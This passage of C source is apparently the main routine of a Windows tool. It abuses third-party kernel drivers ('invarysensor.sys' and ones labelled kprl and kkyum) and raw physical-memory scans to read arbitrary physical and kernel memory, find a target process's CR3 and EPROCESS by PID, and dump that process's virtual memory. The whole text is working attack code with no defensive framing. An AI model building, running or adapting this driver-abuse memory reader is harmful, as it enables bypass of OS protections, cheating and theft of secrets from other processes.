        else if (strcmp(argv[i], "--pid") == 0 && i + 1 < argc) pid = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--scan-start") == 0 && i + 1 < argc) scan_start = _strtoui64(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--scan-size") == 0 && i + 1 < argc) scan_size = _strtoui64(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--read-phys") == 0) do_read_phys = 1;
        else if (strcmp(argv[i], "--locate") == 0) do_locate = 1;
        else if (strcmp(argv[i], "--kkyum") == 0) use_kkyum = 1;
        else if (strcmp(argv[i], "--kprl") == 0) use_kprl = 1;
        else if (strcmp(argv[i], "--invary") == 0) use_invary = 1;
        else if (strcmp(argv[i], "--invary-read") == 0) do_invary_read = 1;
        else if (strcmp(argv[i], "--ranges") == 0) do_ranges = 1;
        else if (strcmp(argv[i], "--auto-ranges") == 0) auto_ranges = 1;
        else if (strcmp(argv[i], "--explicit") == 0) do_explicit = 1;
        else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) { usage(); return 0; }
    }
    if (do_selftest) return selftest_mock();
    if (do_probe) return probe_readers();
    if (do_invary_read) {
        if (!invary_open(invary_device)) {
            printf("[ERR] Invary device open failed (need invarysensor.sys loaded)\n");
            return 3;
        }
        if (!have_va || size == 0) { printf("[ERR] --invary-read needs --va and --size\n"); return 6; }
        uint8_t *b = (uint8_t *)calloc(1, size);
        if (!b) return 6;
        if (!invary_kread(NULL, va, b, size)) {
            printf("[ERR] invary kernel-VA read VA=0x%llX size=%u failed\n",
                   (unsigned long long)va, size);
            free(b);
            return 5;
        }
        printf("[OK] invary kernel-VA read VA=0x%llX size=%u:\n", (unsigned long long)va, size);
        for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
        printf("\nVERDICT=PASS\n");
        free(b);
        return 0;
    }
    if (do_ranges) {
        mb_range rs[256];
        int n = mb_phys_ranges_from_registry(rs, 256);
        if (n <= 0) { printf("[ERR] cannot read physical memory ranges from registry\n"); return 5; }
        printf("[OK] %d physical memory ranges (registry HARDWARE\\RESOURCEMAP):\n", n);
        for (int i = 0; i < n; i++)
            printf("  [%2d] 0x%llX - 0x%llX  len=0x%llX\n", i,
                   (unsigned long long)rs[i].start,
                   (unsigned long long)(rs[i].start + rs[i].length),
                   (unsigned long long)rs[i].length);
        printf("VERDICT=PASS\n");
        return 0;
    }
    if (!kind && !((use_kkyum || use_kprl || use_invary) && do_locate && !have_va)) { usage(); return 6; }

    mb_phys_reader r;
    int have_reader = 0;
    if (kind) {
        if (!reader_open(&r, kind, device)) return 3;
        r.aux = expect_first;
        have_reader = 1;
    } else {
        memset(&r, 0, sizeof(r));
        r.dev = INVALID_HANDLE_VALUE;
    }

    int rc = 0;
    if (do_read_phys) {
        uint8_t *b = (uint8_t *)calloc(1, size);
        if (!b) { rc = 6; goto done; }
        if (!r.read(&r, pa, b, size)) { printf("[ERR] fetch PA=0x%llX failed\n", (unsigned long long)pa); rc = 5; }
        else {
            printf("[OK] read %u bytes at PA=0x%llX\n", size, (unsigned long long)pa);
            for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
            printf("\nVERDICT=PASS\n");
        }
        free(b);
    } else if (do_locate) {
        uint64_t got_cr3 = 0, eproc = 0;
        if (use_invary && pid) {
            if (!invary_locate_cr3(pid, invary_device, &got_cr3, &eproc)) {
                printf("[ERR] 定位层 invary failed (pid=%u): device/ntoskrnl/EPROCESS walk error\n", pid);
                rc = 5;
            } else {
                printf("[OK] 定位层 invary: PID=%u EPROCESS=0x%llX CR3=0x%llX (kernel-VA walk)\n", pid,
                       (unsigned long long)eproc, (unsigned long long)got_cr3);
            }
        } else if (use_kprl && pid) {
            if (!kprl_locate_cr3(pid, kprl_device, &got_cr3)) {
                printf("[ERR] 定位层 kprl failed (pid=%u): device/IOCTL 0x239584 error\n", pid);
                rc = 5;
            } else {
                printf("[OK] 定位层 kprl: PID=%u CR3=0x%llX (KPRL l1malwarebits CR3-by-PID)\n",
                       pid, (unsigned long long)got_cr3);
            }
        } else if (use_kkyum && pid) {
            if (!kkyum_locate_cr3(pid, kkyum_device, &got_cr3, &eproc)) {
                printf("[ERR] 定位层 kkyum failed (pid=%u): device/ntoskrnl/EPROCESS walk error\n", pid);
                rc = 5;
            } else {
                printf("[OK] 定位层 kkyum: PID=%u EPROCESS=0x%llX CR3=0x%llX (kernel-VA walk)\n", pid,
                       (unsigned long long)eproc, (unsigned long long)got_cr3);
            }
        } else if (have_cr3) {
            if (!mb_layer_locate_cr3_explicit(cr3, &got_cr3)) { printf("[ERR] bad explicit CR3\n"); rc = 5; }
            else printf("[OK] 定位层 explicit CR3=0x%llX\n", (unsigned long long)got_cr3);
        } else if (pid && (scan_size || auto_ranges)) {
            if (!name) name = "";
            int ok = 0;
            if (auto_ranges) {
                mb_range rs[256];
                int n = mb_phys_ranges_from_registry(rs, 256);
                printf("[OK] locator: %d physical ranges from registry\n", n);
                for (int i = 0; i < n && !ok; i++) {
                    if (rs[i].length < 0x1000) continue;
                    ok = mb_layer_locate_cr3_scan(&r, rs[i].start, rs[i].length, pid, name,
                                                  &got_cr3, &eproc);
                }
            } else {
                ok = mb_layer_locate_cr3_scan(&r, scan_start, scan_size, pid, name,
                                              &got_cr3, &eproc);
            }
            if (!ok) {
                printf("[ERR] 定位层 scan failed (pid=%u name='%s')\n", pid, name);
                rc = 5;
            } else {
                printf("[OK] 定位层 scan: PID=%u EPROCESS_PA=0x%llX CR3=0x%llX\n", pid,
                       (unsigned long long)eproc, (unsigned long long)got_cr3);
            }
        } else {
            printf("[ERR] locate needs --cr3 or --pid/--scan-start/--scan-size\n");
            rc = 6;
        }
        if (!rc && have_va) {
            if (!have_reader) {
                printf("[ERR] --va read requires a 取数层 --reader (kkyum locator supplies CR3 only)\n");
                rc = 6;
            } else {
                uint8_t *b = (uint8_t *)calloc(1, size);
                if (b && mb_layer_read_va(&r, got_cr3, va, b, size)) {
                    printf("[OK] 翻译+取数 VA=0x%llX -> %u bytes\n", (unsigned long long)va, size);
                    for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
                    printf("\nVERDICT=PASS\n");
                } else { printf("[ERR] read VA failed\n"); rc = 5; }
                free(b);
            }
        }
    } else if (have_cr3 && have_va) {
        uint8_t *b = (uint8_t *)calloc(1, size);
        uint64_t pa_out = 0, page = 0;
        if (!b) { rc = 6; goto done; }
        if (!mb_layer_translate(&r, cr3, va, &pa_out, &page)) {
            printf("[ERR] 翻译层 VA=0x%llX -> PA failed\n", (unsigned long long)va); rc = 5;
        } else {
            printf("[OK] 翻译层 VA=0x%llX -> PA=0x%llX page=0x%llX\n", (unsigned long long)va,
                   (unsigned long long)pa_out, (unsigned long long)page);
            if (!mb_layer_read_va(&r, cr3, va, b, size)) { printf("[ERR] 取数层 failed\n"); rc = 5; }
            else {
                printf("[OK] bytes:\n");
                for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
                printf("\nVERDICT=PASS\n");
            }
        }
        free(b);
    } else {
        usage();
        rc = 6;
    }
done:
    if (have_reader) reader_close(&r);
    return rc;
}
